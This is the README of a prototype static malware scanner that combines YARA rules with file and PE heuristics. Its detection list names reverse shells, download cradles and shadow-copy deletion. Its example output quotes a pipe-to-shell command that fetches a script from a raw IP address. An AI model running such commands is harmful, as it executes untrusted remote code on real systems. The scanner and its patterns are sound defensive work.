# zscan

A prototype **static** malware scanner: YARA rule matching plus simple file heuristics.
It only reads bytes. It never runs, unpacks, or emulates the files it scans.

## What it checks

| Check | What it looks for |
|---|---|
| Hashes | MD5, SHA-1, SHA-256 of every file (for lookup in threat-intel feeds) |
| YARA | Bundled starter rules in `zscan/rules/` (EICAR, UPX packing, ransomware recovery-blocking commands, injection API strings, Office auto-exec macros, PHP webshells), or your own with `-r` |
| Entropy | Whole-file and per-PE-section Shannon entropy (packed or encrypted content) |
| PE heuristics | Packer section names, writable+executable sections, entry point outside or in the last section, missing imports, import combos that suggest injection, keylogging, anti-debugging or privilege tweaks, bad timestamps, overlays |
| Suspicious strings | Encoded PowerShell, download cradles, shadow-copy deletion, Run-key persistence, reverse shells, pipe-to-shell, ransom-note text, raw-IP URLs, .onion addresses, big base64 blobs. String hits count one level lower inside compiled binaries, which embed lots of harmless text. |

Each finding has a severity (INFO, LOW, MED, HIGH, CRIT). Findings add up to a 0 to 100 score:
any CRIT or a score of 70+ is **malicious**, 15+ is **suspicious**, the rest **clean**.

## Install and run

```bash
pip install -e .            # needs yara-python and pefile
zscan path/to/file_or_dir   # or: python -m zscan ...
zscan -q ~/Downloads        # only show non-clean files
zscan --json dir > report.json
zscan -r my_rules/ dir      # use your own YARA rules instead of the bundled ones
```

Exit codes: `0` clean, `1` suspicious found, `2` malicious found, `3` only errors.

Example:

```
MALICIOUS  score=100  samples/eicar.com
    type=text size=68 entropy=4.872 sha256=275a021b...
    [CRIT] YARA: EICAR_Test_File  (EICAR antivirus test file (harmless industry test string))
SUSPICIOUS score= 20  samples/setup.sh
    [MED ] Pipe-to-shell download  (e.g. 'curl http://203.0.113.5:8080/x.sh | bash')
    [LOW ] URL with raw IP address
CLEAN      score=  0  samples/notes.txt
```

## Tests

```bash
pip install -e '.[test]' && pytest
```

Tests build harmless samples at runtime (the EICAR test string, a hand-made non-runnable PE
that looks UPX-packed, scripts with ransomware-style commands). No real malware is used or stored.

Baseline: a scan of 6,260 files from a stock Linux system (`/usr/bin`, Python packages, shared
libraries) gave 0 false positives.

## Limits (it's a prototype)

- Static only, so it is easy to evade with obfuscation, and it cannot see behaviour.
- Small starter rule set. Real coverage needs community rules (for example YARA-Forge or
  signature-base) and hash lookups against threat-intel feeds.
- No archive unpacking (zip, rar), no ELF/Mach-O structure checks yet, files over 64 MiB are skipped.
- Single-threaded: roughly 150 files a second on typical system binaries.
